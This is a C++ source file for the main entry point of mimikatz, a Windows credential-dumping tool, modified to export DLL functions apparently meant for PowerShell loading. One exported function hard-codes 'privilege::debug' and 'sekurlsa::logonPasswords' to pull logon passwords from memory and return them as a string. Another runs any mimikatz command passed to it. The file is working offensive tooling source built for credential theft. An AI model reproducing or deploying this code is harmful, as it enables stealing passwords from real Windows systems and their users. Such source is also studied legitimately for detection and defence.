/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Modifications in this file made by: Joe Bialek. Twitter: @JosephBialek.
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "globdefs.h"
#include <io.h>
#include <fcntl.h>
#include "mimikatz.h"
#include <ShellAPI.h>

int wmain(int argc, wchar_t * argv[])
{
	setlocale(LC_ALL, "French_France.65001");
	_setmode(_fileno(stdin), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
	_setmode(_fileno(stdout), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
	_setmode(_fileno(stderr), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
	
	/*SetConsoleCP(CP_UTF8);
	SetConsoleOutputCP(CP_UTF8);*/
	
	vector<wstring> * mesArguments = new vector<wstring>(argv + 1, argv + argc);
	
	mimikatz * myMimiKatz = new mimikatz(mesArguments);
	delete myMimiKatz, mesArguments;
	return ERROR_SUCCESS;
}

extern "C" __declspec ( dllexport) wchar_t* WStringFunc()
{
	wostringstream *stringStream = new wostringstream();
	outputStream = stringStream;

	vector<wstring>* mesArguments = new vector<wstring>();
	(*mesArguments).push_back(L"privilege::debug");
	(*mesArguments).push_back(L"sekurlsa::logonPasswords");
	(*mesArguments).push_back(L"exit");

	mimikatz* myMimikatz = new mimikatz(mesArguments);
	delete myMimikatz, mesArguments;

	wstring output = (*stringStream).str();
	const wchar_t* outputStr = output.c_str();
	wchar_t* out = new wchar_t[output.size() + 1];
	wcscpy(out, outputStr);
	out[output.size()] = '\0';

	return out;
}

extern "C" __declspec ( dllexport) wchar_t* PSMimikatz(LPCWSTR input)
{
	wostringstream *stringStream = new wostringstream();
	outputStream = stringStream;

	int argc = 0;
	LPWSTR* argv = CommandLineToArgvW(input, &argc);

	vector<wstring> * mesArguments = new vector<wstring>(argv, argv + argc);

	mimikatz* myMimikatz = new mimikatz(mesArguments);
	delete myMimikatz, mesArguments;

	wstring output = (*stringStream).str();
	const wchar_t* outputStr = output.c_str();
	wchar_t* out = new wchar_t[output.size() + 1];
	wcscpy(out, outputStr);
	out[output.size()] = '\0';

	return out;
}

